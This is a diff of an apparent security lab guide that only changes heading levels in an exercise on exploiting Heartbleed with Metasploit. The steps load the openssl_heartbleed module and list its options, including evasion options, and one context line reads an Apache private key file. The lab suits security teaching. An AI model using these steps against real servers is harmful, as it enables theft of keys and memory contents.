@@ -178,37 +178,37 @@ watch 'cat /etc/apache2/ssl/apache.crt ; cat /etc/apache2/ssl/apache.key'
 
 ## Excersice 3 Exploit using metaspoit
 
-### Start the Metasploit console
+#### Start the Metasploit console
 ```shell
 sudo msfconsole
 ```
 
-### Search Heartbleed module by using built in search feature in Metasploit framework
+#### Search Heartbleed module by using built in search feature in Metasploit framework
 ```shell
 search heartbleed
 ```
 
-### Load the heartbleed by module
+#### Load the heartbleed by module
 ```shell
 use auxiliary/scanner/ssl/openssl_heartbleed
 ```
 
-### After loading the auxiliary module, extract the info page to reveal the options to set the target
+#### After loading the auxiliary module, extract the info page to reveal the options to set the target
 ```shell
 show info
 ```
 
-### This is a list of all auxiliary actions that the scanner/ssl/openssl_heartbleed module can do:
+#### This is a list of all auxiliary actions that the scanner/ssl/openssl_heartbleed module can do:
 ```shell
 show actions
 ```
 
-### Here is a complete list of advanced options supported by the scanner/ssl/openssl_heartbleed auxiliary module:
+#### Here is a complete list of advanced options supported by the scanner/ssl/openssl_heartbleed auxiliary module:
 ```shell
 show advanced
 ```
 
-### To view full list of possible evasion options supported by the scanner/ssl/openssl_heartbleed auxiliary module in order to evade defenses:
+#### To view full list of possible evasion options supported by the scanner/ssl/openssl_heartbleed auxiliary module in order to evade defenses:
 ```shell
 show evasion
 ```
